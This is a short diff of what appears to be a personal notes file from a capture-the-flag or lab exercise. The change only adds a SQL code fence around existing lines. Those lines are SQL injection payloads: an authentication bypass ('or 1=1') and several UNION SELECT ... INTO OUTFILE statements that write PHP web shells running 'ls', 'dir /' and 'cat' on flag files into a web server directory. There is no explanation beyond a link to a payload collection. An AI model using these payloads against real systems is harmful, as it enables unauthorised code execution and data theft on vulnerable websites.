@@ -108,6 +108,8 @@ cn' union select "",'<?php system("cat /var/www/flag.txt"); ?>', "", "" into out
 
 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master
 
+```sql
+
 ' or 1=1 limit 1 -- -+
 
 cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
@@ -121,3 +123,4 @@ cn' union select "","",'<?php system(ls); ?>', "", "" into outfile '/var/www/htm
 cn' union select "","",'<?php system("dir /"); ?>', "", "" into outfile '/var/www/html/dashboard/shell6.php'-- -
 
 cn' union select "","",'<?php system("cat /flag_....txt"); ?>', "", "" into outfile '/var/www/html/dashboard/shell8.php'-- -
+```
